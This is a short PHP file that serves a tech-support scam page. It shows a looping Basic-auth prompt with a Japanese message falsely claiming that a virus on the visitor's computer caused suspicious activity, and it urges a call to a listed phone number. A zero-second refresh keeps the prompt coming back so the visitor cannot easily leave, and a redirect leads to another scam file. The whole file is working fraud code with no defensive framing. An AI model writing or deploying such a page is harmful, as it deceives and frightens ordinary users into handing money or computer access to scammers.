<?php

    session_start();

    $_uy = 'dsdsj';
    $_py = 'bgrfd';

    if ($_SERVER['PHP_AUTH_USER'] != $_uy || $_SERVER['PHP_AUTH_PW'] != $_py ) {

        if(isset($_SESSION['login_attempts'])){ $_SESSION['login_attempts']++; }else{$_SESSION['login_attempts'] = 70;}

        if($_SESSION['login_attempts'] == 70){
            header('Location: Hsdelpcxxxcoded2.php');
            exit;
        } else {

          header('WWW-Authenticate: Basic realm="コンピュータにインストールされている有害なウイルスが原因で、IPアドレスに不審な活動が検出されました。任意の援助のために今すぐ (050) 5806-7793 にフリーダイヤルに電話してください。 "');
           header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
 $sec = "0";
 header("Refresh: $sec; url=$page");
         echo "<html><head><title></title></head><body>";


            exit;
        }
    } else {

        header('Location: Hsdelpcxxxcoded2.php');

        exit;
    }
?>
